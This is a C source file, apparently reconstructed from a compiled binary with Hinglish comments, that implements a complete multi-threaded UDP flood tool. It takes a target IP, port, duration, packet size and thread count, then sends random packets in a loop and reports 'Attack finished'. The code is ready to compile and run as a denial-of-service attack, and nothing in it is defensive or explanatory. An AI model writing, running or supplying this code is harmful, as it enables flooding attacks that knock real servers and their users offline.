/*
 * BGMI.c - UDP Network Tool (Multi-threaded)
 * Compile: gcc -pthread -O2 -o BGMI BGMI.c
 * Usage: ./BGMI [IP] [PORT] [TIME] [PACKET_SIZE] [THREAD_COUNT]
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <signal.h>

// Global variables (same as binary mein tha)
volatile int keep_running = 1;
unsigned long long total_data_sent = 0;
pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;

// Thread arguments structure
typedef struct {
    char *target_ip;
    int target_port;
    int duration;
    int packet_size;
    int thread_id;
} thread_args_t;

// Signal handler - Ctrl+C (binary mein handle_signal tha)
void handle_signal(int sig) {
    if (sig == SIGINT) {
        printf("\nAttack finished. All threads stopped.\n");
        keep_running = 0;
    }
}

// Generate random payload (binary mein generate_random_payload tha)
void generate_random_payload(char *buffer, int size) {
    for (int i = 0; i < size; i++) {
        buffer[i] = rand() % 256;
    }
}

// Monitor thread for statistics (binary mein network_monitor tha)
void *network_monitor(void *arg) {
    unsigned long long last_sent = 0;
    int duration = *(int *)arg;
    int elapsed = 0;
    
    while (keep_running && elapsed < duration) {
        sleep(1);
        elapsed++;
        
        pthread_mutex_lock(&mutex);
        unsigned long long current = total_data_sent;
        pthread_mutex_unlock(&mutex);
        
        double mb_sent = (double)(current - last_sent) / (1024.0 * 1024.0);
        printf("Total data sent so far: %.2f MB\r", mb_sent);
        fflush(stdout);
        last_sent = current;
    }
    return NULL;
}

// UDP flood thread (binary mein udp_flood tha)
void *udp_flood(void *arg) {
    thread_args_t *args = (thread_args_t *)arg;
    int sockfd;
    struct sockaddr_in server_addr;
    char *packet;
    int start_time, current_time;
    
    // Create socket (binary mein socket call)
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }
    
    // Setup target address (binary mein inet_addr, htons)
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(args->target_port);
    server_addr.sin_addr.s_addr = inet_addr(args->target_ip);
    
    if (server_addr.sin_addr.s_addr == INADDR_NONE) {
        fprintf(stderr, "Invalid IP address.\n");
        close(sockfd);
        pthread_exit(NULL);
    }
    
    // Allocate packet buffer (binary mein malloc)
    packet = (char *)malloc(args->packet_size);
    if (!packet) {
        perror("Memory allocation failed");
        close(sockfd);
        pthread_exit(NULL);
    }
    
    // Fill with random data
    generate_random_payload(packet, args->packet_size);
    
    start_time = time(NULL);
    
    // Send loop (binary mein sendto call)
    while (keep_running) {
        current_time = time(NULL);
        if ((current_time - start_time) >= args->duration) {
            break;
        }
        
        int sent = sendto(sockfd, packet, args->packet_size, 0,
                         (struct sockaddr *)&server_addr, sizeof(server_addr));
        
        if (sent > 0) {
            pthread_mutex_lock(&mutex);
            total_data_sent += sent;
            pthread_mutex_unlock(&mutex);
        }
    }
    
    free(packet);
    close(sockfd);
    return NULL;
}

int main(int argc, char *argv[]) {
    char *target_ip;
    int target_port;
    int duration;
    int packet_size;
    int thread_count;
    
    pthread_t *threads;
    pthread_t monitor_thread;
    thread_args_t *thread_args;
    
    // Check arguments (binary mein usage string)
    if (argc != 6) {
        printf("Usage: %s [IP] [PORT] [TIME] [PACKET_SIZE] [THREAD_COUNT]\n", argv[0]);
        return 1;
    }
    
    // Parse arguments (binary mein atoi)
    target_ip = argv[1];
    target_port = atoi(argv[2]);
    duration = atoi(argv[3]);
    packet_size = atoi(argv[4]);
    thread_count = atoi(argv[5]);
    
    // Validate (binary mein check tha)
    if (packet_size <= 0 || thread_count <= 0) {
        printf("Invalid packet size or thread count.\n");
        return 1;
    }
    
    // Setup signal handler (binary mein signal call)
    signal(SIGINT, handle_signal);
    
    // Seed random (binary mein srand(time(NULL)))
    srand(time(NULL));
    
    // Allocate memory for threads (binary mein malloc)
    threads = (pthread_t *)malloc(thread_count * sizeof(pthread_t));
    thread_args = (thread_args_t *)malloc(thread_count * sizeof(thread_args_t));
    
    if (!threads || !thread_args) {
        perror("Memory allocation failed");
        return 1;
    }
    
    // Create monitor thread (binary mein pthread_create)
    if (pthread_create(&monitor_thread, NULL, network_monitor, &duration) != 0) {
        perror("Failed to create monitor thread");
        free(threads);
        free(thread_args);
        return 1;
    }
    
    // Create worker threads (binary mein multiple pthread_create)
    for (int i = 0; i < thread_count; i++) {
        thread_args[i].target_ip = target_ip;
        thread_args[i].target_port = target_port;
        thread_args[i].duration = duration;
        thread_args[i].packet_size = packet_size;
        thread_args[i].thread_id = i;
        
        if (pthread_create(&threads[i], NULL, udp_flood, &thread_args[i]) != 0) {
            printf("Failed to create thread %d\n", i);
            keep_running = 0;
            break;
        }
    }
    
    // Wait for all threads (binary mein pthread_join)
    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }
    
    keep_running = 0;
    pthread_join(monitor_thread, NULL);
    
    // Cleanup (binary mein free)
    free(threads);
    free(thread_args);
    
    return 0;
}